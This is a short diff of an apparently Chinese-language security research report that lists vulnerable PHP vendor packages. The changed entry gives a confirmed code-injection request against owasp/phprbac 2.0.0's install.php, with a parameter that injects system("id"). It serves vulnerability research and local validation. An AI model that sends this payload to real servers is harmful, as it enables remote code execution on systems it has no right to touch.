@@ -25,7 +25,7 @@ $$\text{Priority Score} = \text{Web Accessible Entry Points (80\%)} + \text{High
 #### 1. `owasp/phprbac:2.0.0`
 - **狀態**：✅ 已確認 AC
 - **路徑**：`/vendor/owasp/phprbac/PhpRbac/install.php`
-- **利用方式**：`GET /vendor/owasp/phprbac/PhpRbac/install.php?process=1&dbPassword=x";system("id");//`
+- **利用方式**：`GET /vendor/owasp/phprbac/PhpRbac/install.php?process=1&param_pass=x";system("id");//`
 - **後續動作**：作為本地驗證基準線。
 
 #### 2. `interconnectit/search-replace-db:3.1`
